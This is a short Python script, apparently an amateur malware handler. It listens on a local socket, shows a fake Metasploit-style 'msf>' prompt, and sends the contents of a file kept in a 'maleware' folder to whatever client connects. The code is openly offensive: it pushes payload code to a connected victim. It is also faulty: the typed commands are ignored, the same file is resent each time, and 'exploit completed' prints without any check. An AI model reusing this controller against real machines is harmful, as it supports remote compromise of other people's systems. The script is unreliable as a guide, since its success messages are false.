import socket

s=socket.socket()

s.bind(("localhost",6666))

s.listen(1)

(c,(addr))=s.accept()

while True:
    i=input("msf>")

    data=(open("\\pytohn project\\maleware\\exec\\runpy.txt").read())

    c.send(data.encode())

    print(i,"exploit completed")



